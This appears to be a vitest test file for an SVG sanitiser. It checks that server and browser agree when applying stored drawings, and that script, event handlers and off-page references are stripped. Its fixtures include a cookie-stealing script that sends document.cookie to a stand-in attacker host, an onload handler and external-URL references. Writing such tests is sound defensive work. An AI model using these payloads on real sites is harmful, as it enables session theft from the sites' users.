// @vitest-environment jsdom
//
// jsdom rather than the happy-dom the rest of these run under, because this is
// the one file that needs a real XML parser: happy-dom's DOMParser returns an
// empty document for image/svg+xml, which is exactly the call the sanitiser
// depends on. Running these under it proved nothing — every case passed by
// doing nothing at all.
import { execFileSync } from 'node:child_process';
import { describe, expect, it } from 'vitest';
import { applyContent, applySvg } from '../../resources/js/content.js';
import { cleanSvg } from '../../resources/js/svg.js';

const server = (html, overrides = {}) => {
    const out = execFileSync('php', ['tools/server-apply.php'], {
        input: JSON.stringify({ html, overrides, styles: {} }),
        encoding: 'utf8',
    });

    return JSON.parse(out);
};

const browser = (html, overrides = {}) => {
    document.body.innerHTML = html;
    applyContent(document, overrides);

    return document;
};

const both = (html, overrides, styles, read) => {
    const serverResult = server(html, overrides);

    return {
        server: read(new DOMParser().parseFromString(serverResult.html, 'text/html')),
        browser: read(browser(html, overrides)),
    };
};

describe('an inline drawing, applied by the server and by the browser', () => {
    it('agrees on an inline drawing', () => {
        // The scanner marks these and the drawer edits them. The server
        // applied them and the browser did not, so the change showed up in an
        // export and never on the live page.
        const { server: s, browser: b } = both(
            '<svg data-edit-svg="setting:auto:i" class="icon" width="24" height="24"><path d="M1 1"/></svg>',
            { 'auto:i': '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="8"/></svg>' }, {},
            (doc) => {
                const svg = doc.querySelector('[data-edit-svg]');
                return [
                    svg?.tagName.toLowerCase(),
                    svg?.getAttribute('class'),
                    svg?.getAttribute('width'),
                    // Case-sensitive: parsed as HTML this becomes "viewbox"
                    // and the drawing loses its coordinate system.
                    svg?.getAttribute('viewBox'),
                    svg?.querySelector('circle') ? 'circle' : 'none',
                ].join('|');
            },
        );

        expect(b).toBe(s);
        expect(b).toBe('svg|icon|24|0 0 32 32|circle');
    });

    it('agrees on refusing a drawing that carries script', () => {
        // The only stored value that is markup, arriving over the network. A
        // hole on one kind of site and not the other is the thing to prevent.
        const { server: s, browser: b } = both(
            '<svg data-edit-svg="setting:auto:i" class="icon"><path d="M1 1"/></svg>',
            { 'auto:i': '<svg viewBox="0 0 10 10"><script>fetch("https://attacker.test/"+document.cookie)<\/script><circle cx="5" cy="5" r="4" onload="alert(1)"/></svg>' }, {},
            (doc) => {
                const svg = doc.querySelector('[data-edit-svg]');
                const html = svg?.outerHTML ?? '';
                return [
                    /<script/i.test(html) ? 'script' : 'no-script',
                    /onload/i.test(html) ? 'onload' : 'no-onload',
                    svg?.querySelector('circle') ? 'circle-kept' : 'circle-lost',
                ].join('|');
            },
        );

        expect(b).toBe(s);
        expect(b).toBe('no-script|no-onload|circle-kept');
    });
});

describe('rebuilding a drawing from what is allowed', () => {
    it('keeps the coordinate system', () => {
        // Parsed as HTML, viewBox becomes viewbox and the drawing loses the
        // box it is drawn in — a 24px glyph renders at its natural size.
        const clean = cleanSvg('<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="8"/></svg>');

        expect(clean.getAttribute('viewBox')).toBe('0 0 32 32');
    });

    it('drops anything that loads or executes', () => {
        const clean = cleanSvg(`<svg viewBox="0 0 10 10">
            <script>fetch('https://attacker.test/'+document.cookie)</script>
            <circle cx="5" cy="5" r="4" onload="alert(1)"/>
            <image href="https://attacker.test/pixel.png"/>
        </svg>`);
        const html = clean.outerHTML;

        expect(html).not.toMatch(/<script/i);
        expect(html).not.toMatch(/onload/i);
        expect(html).not.toMatch(/attacker\.test/);
        expect(clean.querySelector('circle')).not.toBe(null);
    });

    it('refuses a reference that points off this page', () => {
        // url() in a presentation attribute can fetch.
        const clean = cleanSvg('<svg viewBox="0 0 10 10"><circle r="4" fill="url(https://attacker.test/x)"/><rect fill="url(#local)"/></svg>');

        expect(clean.querySelector('circle').hasAttribute('fill')).toBe(false);
        expect(clean.querySelector('rect').getAttribute('fill')).toBe('url(#local)');
    });

    it('is nothing rather than something when it is not a drawing', () => {
        expect(cleanSvg('<p>hello</p>')).toBe(null);
        expect(cleanSvg('')).toBe(null);
        expect(cleanSvg('<svg></svg>')).toBe(null);
    });

    it('keeps the sizing the theme gave the element', () => {
        // Swapping the element wholesale would drop the class and the width
        // with it, and the icon would render at its natural size.
        document.body.innerHTML = '<svg data-edit-svg="setting:auto:i" class="icon size-4" width="24" height="24"><path d="M1 1"/></svg>';

        applySvg(document.querySelector('[data-edit-svg]'), '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="8"/></svg>');

        const svg = document.querySelector('[data-edit-svg]');
        expect(svg.getAttribute('class')).toBe('icon size-4');
        expect(svg.getAttribute('width')).toBe('24');
        expect(svg.querySelector('circle')).not.toBe(null);
    });

    it('leaves the drawing alone when the stored value is unusable', () => {
        document.body.innerHTML = '<svg data-edit-svg="setting:auto:i"><path d="M1 1"/></svg>';

        expect(applySvg(document.querySelector('[data-edit-svg]'), 'not an svg')).toBe(false);
        expect(document.querySelector('path')).not.toBe(null);
    });
});
